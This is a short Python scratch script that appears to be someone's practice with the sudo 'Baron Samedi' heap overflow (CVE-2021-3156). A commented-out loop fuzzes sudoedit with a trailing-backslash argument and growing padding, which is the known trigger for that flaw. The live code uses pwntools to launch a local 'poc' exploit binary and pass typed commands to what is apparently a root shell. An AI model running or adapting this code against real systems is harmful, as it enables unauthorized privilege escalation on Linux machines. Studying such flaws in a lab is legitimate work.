
# tuan_name = str(input("hay nhap ten cua ban : "))
# print("ten cua tuan la "+ tuan_name)
# print(''.join(['\033[' + str(x) + 'mfoo' for x in range(0,150)]) +'\033[0m')
# thử brute force sudo
# import subprocess
# for i in range(0,1000):
#     print(subprocess.run(["/usr/bin/sudoedit",'-s','aaaaaaaaaaaaaaa\\','b'*i]))

from pwn import *
s = process("/home/cheaterdxd/dttn/linux/cve_2021_3156/poc")

while(1):
    command = input("# ")
    s.sendline(command)
    print(s.recvline())

